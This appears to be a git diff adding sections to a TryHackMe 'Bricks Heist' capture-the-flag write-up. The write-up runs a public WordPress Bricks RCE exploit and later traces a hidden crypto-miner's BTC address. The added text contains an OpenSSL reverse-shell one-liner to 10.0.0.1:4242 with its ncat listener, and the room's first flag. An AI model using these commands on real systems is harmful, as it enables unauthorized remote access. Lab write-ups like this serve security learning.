@@ -14,6 +14,11 @@ Tryhackme [link](https://tryhackme.com/r/room/tryhack3mbricksheist)
 - [2. dirb](#2-dirb)
 - [3. wpscan](#3-wpscan)
 - [4. Exploit preparation](#4-exploit-preparation)
+- [5. First flag](#5-first-flag)
+- [6. Reverse Shell](#6-reverse-shell)
+- [7. Service analysis](#7-service-analysis)
+- [8. BTC address](#8-btc-address)
+- [9. BTC address owner](#9-btc-address-owner)
 
 
 ---
@@ -59,8 +64,6 @@ Using wpscan we can see that there are three vulnerabilities, one of them is an 
 
 After looking for the RCE vulnerability i've found this [github](https://github.com/Chocapikk/CVE-2024-25600), we'll clone it:
 
-
-
 Install the requirements with pip:
 
 ![](./img/07.png)
@@ -73,6 +76,8 @@ And execute with `python3 exploit.py --url https://bricks.thm/`
 
 <br>
 
+### 5. First flag
+
 Once inside we can see we're inside the `/data/www/default` directory, inside there's the first flag `THM{fl46_650c844110baced87e1606453b93f22a}`
 
 ![](./img/09.png)
@@ -83,23 +88,88 @@ I've tried to get the root db password by listing the contents of `wp-config.php
 
 ![](./img/10.png)
 
+<br>
 
-https://github.com/aels/CVE-2022-2586-LPE
+### 6. Reverse Shell
+
+For comodity i'll get a reverse shell running with open-ssl:
+
+` mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s`
 
 ![](./img/11.png)
 
+The listener was:
+`ncat --ssl -vv -l -p 4242`
+
 ![](./img/12.png)
+
+### 7. Service analysis
+
+We can list the running proceses with `systemctl --type=service --state=running` and `ubuntu.service` looks quite suspicious:
 
 ![](./img/13.png)
 
+<br>
+
+With `systemctl cat ubuntu.service` we can see asociated info with the service, the task that's being called is `nm-inet-dialog` wich is the name of the process.
+
 ![](./img/14.png)
+
+<br>
+
+If we list the contents of the parent's folder of the process there is only one file with read permissions `inet.conf`:
 
 ![](./img/15.png)
 
+<br>
+
+### 8. BTC address
+
+As we can see we've found the process that's related to the miner, now we need to figure out the crypto address:
+
 ![](./img/16.png)
 
-![](./img/17.png)
+<br>
 
-![](./img/18.png)
+With [dencode.com](https://dencode.com/string) we'll decode the string three times:
 
-![](./img/19.png)
+The first conversión is to Hex:
+
+![](img/17.png)
+
+<br>
+
+Then to Base64:
+
+![](img/18.png)
+
+<br>
+
+And again Base64:
+
+![](img/19.png)
+
+The string is repeated and if we cut it in half we get the BTC address: `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`
+
+
+With [dencode.com](https://dencode.com/string)
+
+### 9. BTC address owner
+
+First we'll lookup the address on [blockchain.com](https://www.blockchain.com/explorer/addresses/btc/bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa)
+
+The first transaction was from `bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r`
+
+![](img/20.png)
+
+<br>
+
+Afeter a google search we can see the next article:
+
+![](img/21.png)
+
+<br>
+
+And the address is related to `LockBit`:
+
+![](img/22.png)
